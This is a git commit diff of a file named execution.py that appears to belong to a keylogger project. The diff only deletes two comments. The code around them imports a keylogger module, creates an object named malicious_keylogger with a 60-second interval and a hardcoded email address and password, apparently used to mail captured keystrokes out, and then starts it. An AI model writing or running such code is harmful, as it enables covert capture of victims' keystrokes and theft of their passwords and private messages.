c8a11c09a30fc9f1853ce1f126c74ac4b252df59
Kilaru Satyasai <90923325+SatyaKilaru@users.noreply.github.com>
2023-05-26 14:00:47 +0530

    Update execution.py

--- execution.py
+++ execution.py
@@ -1,12 +1,10 @@
 import keylogger
 
 
-# Initialize / create keylogger
 import keylogger
 
 
 malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'executormail@gmail.com', 'executor_password')
 
-# Execute Keylogger
 
 malicious_keylogger.start()
